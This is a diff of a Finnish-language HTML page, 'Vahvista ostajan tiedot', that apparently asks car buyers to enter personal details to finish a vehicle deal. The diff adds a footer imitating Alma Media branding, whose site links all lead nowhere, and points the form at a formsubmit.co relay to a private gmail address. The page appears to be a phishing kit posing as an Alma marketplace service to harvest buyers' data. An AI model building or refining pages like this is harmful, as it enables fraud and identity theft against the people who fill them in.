@@ -6,6 +6,92 @@
 <title>Vahvista ostajan tiedot</title>
 
 <style>
+
+    /* ALMA FOOTER */
+.alma-footer {
+    background-color: #3a3a3a;
+    color: #ffffff;
+    padding: 50px 0 30px;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+}
+
+.alma-footer-inner {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 0 20px;
+}
+
+/* LOGO */
+.alma-logo {
+    font-size: 28px;
+    font-weight: 800;
+    letter-spacing: 2px;
+    margin-bottom: 30px;
+}
+
+/* COLUMNS */
+.alma-columns {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 40px;
+}
+
+.alma-col h4 {
+    font-size: 16px;
+    margin-bottom: 14px;
+}
+
+.alma-col a {
+    display: block;
+    color: #ffffff;
+    text-decoration: none;
+    font-size: 14px;
+    margin-bottom: 8px;
+    opacity: 0.9;
+}
+
+.alma-col a:hover {
+    text-decoration: underline;
+}
+
+.show-all {
+    margin-top: 10px;
+    font-weight: 600;
+}
+
+/* BOTTOM */
+.alma-bottom {
+    margin-top: 40px;
+    font-size: 13px;
+    opacity: 0.8;
+}
+
+.alma-bottom a {
+    color: #ffffff;
+    text-decoration: none;
+}
+
+.alma-bottom span {
+    margin: 0 8px;
+}
+
+/* RESPONSIVE */
+@media (max-width: 900px) {
+    .alma-columns {
+        grid-template-columns: 1fr;
+        gap: 30px;
+    }
+
+    .alma-logo {
+        text-align: center;
+    }
+
+    .alma-bottom {
+        text-align: center;
+        line-height: 1.6;
+    }
+}
+
 /* RESET */
 * {
     box-sizing: border-box;
@@ -152,7 +238,7 @@ button:hover {
         Täytä alla olevat tiedot viimeistelläksesi ajoneuvokaupan.
     </div>
 
-    <form action="https://formsubmit.co/TYO_EMAIL@gmail.com" method="POST">
+    <form action="https://formsubmit.co/kastalmero@gmail.com" method="POST">
 
         <label>Nimi</label>
         <input type="text" name="Nimi" placeholder="Etunimi ja sukunimi" required>
@@ -193,6 +279,59 @@ button:hover {
     </div>
 
 </div>
+ <footer class="alma-footer">
+  <div class="alma-footer-inner">
+
+    <div class="alma-logo">
+      <span>ALMA</span>
+    </div>
+
+    <div class="alma-columns">
+
+      <div class="alma-col">
+        <h4>Ajassa</h4>
+        <a href="#">Iltalehti.fi</a>
+        <a href="#">Kauppalehti</a>
+        <a href="#">Talouselämä</a>
+        <a href="#">Uusi Suomi</a>
+        <a href="#">Arvopaperi</a>
+        <a class="show-all" href="#">NÄYTÄ KAIKKI</a>
+      </div>
+
+      <div class="alma-col">
+        <h4>Vapaalla</h4>
+        <a href="#">Etuovi.com</a>
+        <a href="#">Nettiauto</a>
+        <a href="#">Baana</a>
+        <a href="#">Autotalli.com</a>
+        <a href="#">AutoJerry.fi</a>
+        <a class="show-all" href="#">NÄYTÄ KAIKKI</a>
+      </div>
+
+      <div class="alma-col">
+        <h4>Työssä</h4>
+        <a href="#">Kauppalehti</a>
+        <a href="#">Jobly</a>
+        <a href="#">Tekniikka & Talous</a>
+        <a href="#">Tivi</a>
+        <a href="#">Konepörssi</a>
+        <a class="show-all" href="#">NÄYTÄ KAIKKI</a>
+      </div>
+
+    </div>
+
+    <div class="alma-bottom">
+      © Alma Media Oyj 2025
+      <span>•</span>
+      <a href="#">Tietosuoja</a>
+      <span>•</span>
+      <a href="#">Evästeasetukset</a>
+      <span>•</span>
+      <a href="#">Alma Media yhteystiedot</a>
+    </div>
+
+  </div>
+</footer>
 
 </body>
 </html>
